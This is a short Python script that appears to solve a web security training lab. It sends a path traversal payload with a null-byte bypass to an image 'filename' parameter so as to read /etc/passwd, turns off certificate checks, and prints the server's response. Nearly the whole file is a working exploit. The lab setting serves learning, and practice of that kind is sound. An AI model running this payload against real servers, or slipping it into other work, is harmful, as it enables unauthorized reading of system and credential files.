import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    base_url = 'https://0ac000fd0330f26a8134e39b00f500b7.web-security-academy.net'
    product_url = f'{base_url}/image?filename='
    payload = '../../../etc/passwd%00.jpg'

    session = requests.Session()
    attack_url = f'{product_url}{payload}'
    response = session.get(attack_url,verify=False)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        print(soup)
        print("Koated !!")
    else :
        print("ya siks")

if __name__ == "__main__" :
    main()